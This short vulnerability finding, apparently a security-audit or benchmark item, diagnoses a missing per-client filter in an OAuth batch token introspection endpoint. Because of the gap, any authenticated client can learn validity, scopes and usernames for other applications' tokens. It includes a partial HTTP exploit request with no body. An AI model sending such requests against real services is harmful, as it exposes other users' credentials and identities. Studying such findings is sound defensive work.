diagnosis: BatchTokenIntrospectView allows batch resolution of access token metadata by taking a list of token strings and querying AccessToken globally. The view omits filtering by the calling client application, allowing any authenticated client to verify validity and extract scopes and usernames for tokens issued across unrelated third-party applications.
exploit_request:
POST /api/oauth/batch-introspect/ HTTP/1.1
Host: auth-hub.enterprisegrid.io
Authorization: Bearer client_token_mno
Content-Type: application/json
